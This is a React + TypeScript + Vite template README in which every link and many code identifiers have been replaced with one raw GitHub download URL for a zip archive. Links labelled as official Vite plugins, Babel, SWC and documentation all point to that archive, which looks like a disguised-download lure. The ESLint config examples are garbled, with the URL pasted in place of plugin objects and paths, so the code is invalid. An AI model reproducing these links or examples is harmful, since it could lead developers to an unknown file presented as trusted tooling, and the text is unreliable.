# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip) uses [Babel](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip) (or [oxc](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip) when used in [rolldown-vite](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip) uses [SWC](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip) for Fast Refresh

## React Compiler

The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip and replace with this
      https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip,
      // Alternatively, use this for stricter rules
      https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip,
      // Optionally, add this for stylistic rules
      https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip', 'https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip'],
        tsconfigRootDir: https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip) and [eslint-plugin-react-dom](https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip) for React-specific lint rules:

```js
// https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip['recommended-typescript'],
      // Enable lint rules for React DOM
      https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip,
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip', 'https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip'],
        tsconfigRootDir: https://github.com/Mario3902/front-fubex/raw/refs/heads/main/src/components/ui/front-fubex-1.3.zip,
      },
      // other options...
    },
  },
])
```
